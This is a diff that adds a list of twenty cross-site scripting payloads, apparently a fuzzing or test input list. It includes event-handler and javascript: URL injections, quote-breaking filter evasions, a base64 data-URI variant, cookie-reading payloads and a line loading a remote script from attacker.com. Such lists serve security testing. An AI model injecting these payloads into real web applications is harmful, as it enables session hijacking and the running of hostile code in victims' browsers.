@@ -1,0 +1,20 @@
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+<script src="http://attacker.com/xss.js"></script>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert(1)"></iframe>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)">
+<audio src/onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+"><script>alert(document.cookie)</script>
+"><img src=x onerror=prompt(1)>
+'-alert(1)-'
+\"><svg onload=alert(document.domain)>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
+<a href="javascript:void(0)" onclick="alert(1)">Click</a>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<div style="background-image: url(javascript:alert(1))">
